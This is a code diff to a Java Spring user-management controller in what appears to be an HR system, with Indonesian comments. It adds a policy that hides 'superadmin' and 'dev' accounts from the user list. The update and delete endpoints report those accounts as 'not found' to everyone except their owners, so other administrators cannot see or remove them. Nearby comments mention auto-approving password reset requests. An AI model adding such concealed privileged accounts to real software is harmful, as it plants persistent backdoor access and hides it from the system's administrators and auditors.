@@ -19,6 +19,7 @@ import sys.hris.sims.activity_logs.service.ActivityLogService;
 // [BARU] dibutuhkan untuk auto-approve permintaan reset password, lihat
 // blok passwordResetRequestId di updateUser() di bawah.
 import sys.hris.sims.passwordreset.service.PasswordResetService;
+import sys.hris.sims.common.service.HiddenAccountPolicy; // [BARU]
 
 @RestController
 @RequestMapping("/api/users")
@@ -28,17 +29,20 @@ public class UserController {
     private final PasswordEncoder passwordEncoder;
     private final ActivityLogService activityLogService;
     private final PasswordResetService passwordResetService; // [BARU]
+    private final HiddenAccountPolicy hiddenAccountPolicy; // [BARU] superadmin & dev tersembunyi
 
     public UserController(UserRepository userRepository,
                           RoleRepository rolesRepository,
                           PasswordEncoder passwordEncoder,
                           ActivityLogService activityLogService,
-                          PasswordResetService passwordResetService) {
+                          PasswordResetService passwordResetService,
+                          HiddenAccountPolicy hiddenAccountPolicy) {
         this.userRepository = userRepository;
         this.rolesRepository = rolesRepository;
         this.passwordEncoder = passwordEncoder;
         this.activityLogService = activityLogService;
         this.passwordResetService = passwordResetService; // [BARU]
+        this.hiddenAccountPolicy = hiddenAccountPolicy; // [BARU]
     }
 
     // Helper untuk konsistensi data log
@@ -73,6 +77,7 @@ public class UserController {
     public ResponseEntity<?> getAllUsers(Authentication authentication, HttpServletRequest httpRequest) {
         List<User> users = userRepository.findAll();
         List<UserResponse> response = users.stream()
+                .filter(u -> !hiddenAccountPolicy.isHiddenUser(u)) // [BARU] superadmin & dev tidak pernah ada di daftar user
                 .map(u -> new UserResponse(
                         u.getUserId(),
                         u.getUsername(),
@@ -92,6 +97,10 @@ public class UserController {
             HttpServletRequest httpRequest) {
 
         User user = userRepository.findById(id).orElse(null);
+        // [BARU] Akun tersembunyi hanya bisa diubah pemiliknya sendiri; selain itu = "tidak ditemukan".
+        if (user != null && !hiddenAccountPolicy.canAccess(user, getUsername(authentication))) {
+            user = null;
+        }
         if (user == null) {
             activityLogService.log(
                     getUsername(authentication),
@@ -199,6 +208,10 @@ public class UserController {
     @DeleteMapping("/{id}")
     public ResponseEntity<?> deleteUser(@PathVariable Long id, Authentication authentication, HttpServletRequest httpRequest) {
         User user = userRepository.findById(id).orElse(null);
+        // [BARU] Akun tersembunyi tidak bisa dihapus siapa pun selain lewat jalur pemiliknya.
+        if (user != null && !hiddenAccountPolicy.canAccess(user, getUsername(authentication))) {
+            user = null;
+        }
         if (user == null) {
             return ResponseEntity.status(404).body("User tidak ditemukan");
         }
